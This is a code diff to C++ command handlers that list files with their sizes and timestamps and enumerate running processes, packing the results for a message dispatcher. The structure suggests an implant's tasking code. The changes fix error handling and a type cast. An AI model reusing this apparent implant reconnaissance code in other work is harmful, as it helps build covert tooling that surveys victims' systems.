@@ -42,32 +42,35 @@ namespace Commands {
             x_memcpy(path, query, MAX_PATH);
         }
 
-        x_assert(file = Ctx->win32.FindFirstFileA(path, &head));
+        if ((file = Ctx->win32.FindFirstFileA(path, &head))) {
+            do {
+                x_assert(Ctx->win32.FileTimeToSystemTime(&head.ftLastAccessTime, &access_time));
+                x_assert(Ctx->win32.SystemTimeToTzSpecificLocalTime(nullptr, &access_time, &sys_time));
 
-        do {
-            x_assert(Ctx->win32.FileTimeToSystemTime(&head.ftLastAccessTime, &access_time));
-            x_assert(Ctx->win32.SystemTimeToTzSpecificLocalTime(nullptr, &access_time, &sys_time));
+                if (head.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+                    Stream::PackDword(out, TRUE);
+                }
+                else {
+                    file_size.HighPart   = head.nFileSizeHigh;
+                    file_size.LowPart    = head.nFileSizeLow;
 
-            if (head.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
-                Stream::PackDword(out, TRUE);
+                    Stream::PackDword(out, FALSE);
+                    Stream::PackDword64(out, file_size.QuadPart);
+                }
+
+                Stream::PackDword(out, access_time.wMonth);
+                Stream::PackDword(out, access_time.wDay);
+                Stream::PackDword(out, access_time.wYear);
+                Stream::PackDword(out, sys_time.wHour);
+                Stream::PackDword(out, sys_time.wMinute);
+                Stream::PackDword(out, sys_time.wSecond);
+                Stream::PackString(out, head.cFileName);
             }
-            else {
-                file_size.HighPart   = head.nFileSizeHigh;
-                file_size.LowPart    = head.nFileSizeLow;
-
-                Stream::PackDword(out, FALSE);
-                Stream::PackDword64(out, file_size.QuadPart);
-            }
-
-            Stream::PackDword(out, access_time.wMonth);
-            Stream::PackDword(out, access_time.wDay);
-            Stream::PackDword(out, access_time.wYear);
-            Stream::PackDword(out, sys_time.wHour);
-            Stream::PackDword(out, sys_time.wMinute);
-            Stream::PackDword(out, sys_time.wSecond);
-            Stream::PackString(out, head.cFileName);
+            while (Ctx->win32.FindNextFileA(file, &head) != 0);
         }
-        while (Ctx->win32.FindNextFileA(file, &head) != 0);
+        else {
+            goto defer;
+        }
 
         Dispatcher::MessageQueue(out);
 
@@ -156,7 +159,7 @@ namespace Commands {
             OBJECT_ATTRIBUTES   attr    = { };
 
             cid.UniqueThread    = nullptr;
-            cid.UniqueProcess   = (HANDLE) entries.th32ProcessID;
+            cid.UniqueProcess   = (void*) entries.th32ProcessID;
 
             InitializeObjectAttributes(&attr, nullptr, 0, nullptr, nullptr);
 
@@ -189,7 +192,6 @@ namespace Commands {
             Ctx->nt.NtClose(process);
         }
         while (Ctx->win32.Process32Next(snapshot, &entries));
-
         Dispatcher::MessageQueue(out);
 
         defer:
